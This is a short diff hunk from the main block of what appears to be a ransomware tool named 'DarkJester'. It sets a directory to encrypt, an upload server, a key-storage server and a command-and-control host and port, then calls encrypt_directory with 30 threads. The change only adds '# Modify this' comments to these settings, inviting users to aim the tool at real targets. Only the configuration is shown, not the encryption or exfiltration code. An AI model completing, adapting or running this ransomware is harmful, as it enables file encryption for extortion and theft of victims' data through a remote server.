@@ -450,11 +450,11 @@ if __name__ == "__main__":
         )
         sys.exit(1)
 
-    directory_path = "path_to_directory_to_encrypt"
-    server_url = "http://127.0.0.1:5000/upload"
-    key_server_url = "http://127.0.0.1:5000/store-key"
-    c2_host = "127.0.0.1"
-    c2_port = 1234
+    directory_path = "path_to_directory_to_encrypt" # Modify this
+    server_url = "http://127.0.0.1:5000/upload" # Modify this
+    key_server_url = "http://127.0.0.1:5000/store-key" # Modify this
+    c2_host = "127.0.0.1" # Modify this
+    c2_port = 1234 # Modify this
 
     jester = DarkJester()
     jester.encrypt_directory(directory_path, server_url, max_threads=30)
